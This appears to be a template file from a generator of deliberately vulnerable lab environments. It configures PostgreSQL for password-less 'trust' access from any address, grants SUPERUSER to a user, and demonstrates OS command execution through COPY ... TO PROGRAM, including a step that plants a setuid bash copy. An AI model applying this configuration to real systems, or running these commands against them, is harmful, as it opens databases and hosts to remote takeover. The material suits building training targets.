---
id: postgres_rce
description: Configures PostgreSQL with pg_hba.conf set to trust authentication and grants SUPERUSER to a low-privilege database user, enabling Remote Code Execution via the COPY ... TO PROGRAM SQL command.
required_vars: [db_user]
---
# Atom: PostgreSQL RCE via COPY TO PROGRAM
PostgreSQL's `COPY ... TO PROGRAM` feature executes an OS command as the `postgres` system user. When a database user has `SUPERUSER` privileges and authentication is set to `trust` (no password required), any user who can connect to the database can achieve OS-level code execution.

### Logic Requirements:
1. Install PostgreSQL: `apt-get install -y postgresql`
2. Start PostgreSQL: `service postgresql start`
3. Configure `pg_hba.conf` to use `trust` authentication for local and host connections:
   ```
   local   all   all             trust
   host    all   all   0.0.0.0/0 trust
   ```
4. Configure `postgresql.conf` to listen on all interfaces: `listen_addresses = '*'`
5. Create `<db_user>` with SUPERUSER: `CREATE USER <db_user> WITH SUPERUSER;`
6. Reload PostgreSQL config.

### Common Patterns:
- **Full Setup Script:**
  ```bash
  apt-get install -y postgresql
  service postgresql start

  # Allow all connections without password
  PG_HBA=$(find /etc/postgresql -name pg_hba.conf | head -1)
  cat > "$PG_HBA" << 'EOF'
  local   all   all             trust
  host    all   all   0.0.0.0/0 trust
  EOF

  # Listen on all interfaces
  PG_CONF=$(find /etc/postgresql -name postgresql.conf | head -1)
  sed -i "s/#listen_addresses = 'localhost'/listen_addresses = '*'/" "$PG_CONF"

  # Create superuser
  su -c "psql -c \"CREATE USER <db_user> WITH SUPERUSER;\"" postgres
  su -c "psql -c \"CREATE DATABASE <db_user> OWNER <db_user>;\"" postgres

  service postgresql restart
  ```

### Testing Guidance:
1. Verify PostgreSQL is listening on 0.0.0.0: `ss -tlnp | grep 5432`
2. Connect without a password: `psql -U <db_user> -h 127.0.0.1 -c 'SELECT current_user, pg_is_in_recovery();'`
3. Verify SUPERUSER privilege: `psql -U <db_user> -h 127.0.0.1 -c '\du'` — `<db_user>` should show `Superuser` attribute.
4. Test RCE via COPY TO PROGRAM:
   ```sql
   psql -U <db_user> -h 127.0.0.1 -c "COPY (SELECT '') TO PROGRAM 'id > /tmp/rce_proof.txt'"
   cat /tmp/rce_proof.txt
   ```
   Output should contain `uid=` confirming OS command execution.
5. Escalate: `COPY (SELECT '') TO PROGRAM 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'`

### Synthesis Guidance:
Use the versioned paths for `pg_hba.conf` and `postgresql.conf` (e.g. `/etc/postgresql/14/main/`). Use shell globbing (`find /etc/postgresql -name pg_hba.conf | head -1`) to avoid hardcoding the version. The `trust` authentication method eliminates all password requirements — combine with `database_expose` to allow remote exploitation. Note: `COPY TO PROGRAM` requires PostgreSQL >= 9.3.
